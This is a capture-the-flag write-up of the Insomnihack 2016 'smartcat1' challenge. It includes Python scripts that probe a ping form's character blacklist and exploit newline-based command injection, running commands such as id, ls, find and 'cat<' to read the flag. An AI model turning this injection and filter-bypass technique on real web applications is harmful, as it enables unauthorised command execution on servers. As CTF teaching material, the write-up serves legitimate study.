Insomnihack Teaser 2016 – smartcat1 – 50 pt Web Challenge
---------------------------------------------------------

Happy new year CTFers! 2016 brings a us a super fun Insomnihack teaser. The theme being Internet of Things^H^H^H^H^H $h!T.

This first challenge was really trivial but probably stumped some people judging by IRC. Funny thing is I had just recently solved a very similar challenge in another CTF so the first thing I tried worked.

So we read the clue and all we really have is a link, at the link (http://smartcat.insomnihack.ch/cgi-bin/index.cgi) we’re greeted with a “ping destination” input box.


Ok so immediately your “command injection” alarm bells ring all at once, and yeah you’re right. There’s a blacklist of acceptable characters though and the usual assortment of command injection characters like $, `, |, & and so on are rejected.

At this point I want to map out the blacklist definitively so I create some Python code to enumerate the script’s responses to inputs. The below script just sends each possible character, then the “id” command and then parses for possible error messages:
```
#!/usr/bin/python

import requests

URL = 'http://smartcat.insomnihack.ch/cgi-bin/index.cgi'

s = requests.Session()

for i in range(0,256):
	payload = { 'dest' : chr(i) + 'id' + chr(i)}
	bad = 0

	print "[*] Trying " + hex(i)
	print "[*] Trying " + payload['dest']
	r = s.post(URL, data=payload)

	for line in r.content.splitlines():
		if 'Error running ping' in line:
			bad+=1
			print line

		if 'Bad character' in line:
			bad += 1
			print line

	if bad == 0:
		print r.content
```
Which, rather quickly returns me a successful payload execution when i = 0x0a:
```
[*] Trying 0x9
[*] Trying 	id	
  <pre>Bad character 	 in dest</pre>
[*] Trying 0xa
[*] Trying 
id


<html>

<head><title>Can I haz Smart Cat ???</title></head>

<body>

  <h3> Smart Cat debugging interface </h3>



  <form method="post" action="index.cgi">
    <p>Ping destination: <input type="text" name="dest"/></p>
  </form>

  <p>Ping results:</p><br/>
  <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
```
Ok so we can get command execution, but letting the script play out, we have found a pretty depressing set of restricted input characters consisting of:

    <space>, $, ;, &, |, (, {, ` and <tab>

Fortunately we have shell redirection characters “<” and “>” and that’s all we need. We first have to track down the flag, I issue an “ls” command to see the files in the current directory, using this script:

 
```
#!/usr/bin/python

import requests
import sys

URL = 'http://smartcat.insomnihack.ch/cgi-bin/index.cgi'

s = requests.Session()

payload = { 'dest' : chr(10) + sys.argv[1] }

r = s.post(URL, data=payload)

preparsing = False
for line in r.content.splitlines():
	if '</pre>' in line:
		preparsing = False

	if preparsing:
		print line

	if '<pre>' in line:
		print line.replace("<pre>","")
		preparsing = True
```
Where I find a interesting file or folder called “there”:
```
root@ubuntu:~/insomnihack/smartcat# ./sc_cmd.py ls
  index.cgi
there
```
I issue the “find” command to investigate further which leads me to the flag, as seen here:

```
root@ubuntu:~/insomnihack/smartcat# ./sc_cmd.py find
  .
./index.cgi
./there
./there/is
./there/is/your
./there/is/your/flag
./there/is/your/flag/or
./there/is/your/flag/or/maybe
./there/is/your/flag/or/maybe/not
./there/is/your/flag/or/maybe/not/what
./there/is/your/flag/or/maybe/not/what/do
./there/is/your/flag/or/maybe/not/what/do/you
./there/is/your/flag/or/maybe/not/what/do/you/think
./there/is/your/flag/or/maybe/not/what/do/you/think/really
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag
root@ubuntu:~/insomnihack/smartcat# ./sc_cmd.py cat\<./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag

  INS{warm_kitty_smelly_kitty_flush_flush_flush}
```
